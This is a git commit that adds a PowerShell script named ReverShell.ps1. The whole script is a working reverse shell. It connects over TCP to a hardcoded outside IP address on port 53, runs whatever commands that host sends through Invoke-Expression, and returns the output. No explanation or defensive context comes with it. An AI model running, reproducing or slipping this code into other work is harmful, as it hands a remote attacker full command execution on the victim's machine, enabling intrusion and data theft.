0ea5bd87b2f8df52b494b52a78afedde0966dfa1
INotGreen <89376703+INotGreen@users.noreply.github.com>
2022-11-22 15:53:45 +0800

    Create ReverShell.ps1

---
+++ ReverShell.ps1
@@ -0,0 +1,11 @@
+$shell = New-Object System.Net.Sockets.TCPClient('124.220.178.26', 53); 
+$stream = $shell.GetStream(); 
+[byte[]]$bytes = 0..65535 | % { 0 }; 
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    ; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+    $sendback = (iex $data 2>&1 | Out-String ); 
+    $sendback2 = $sendback + '<shell>'; 
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() 
+}; 
+$shell.Close()
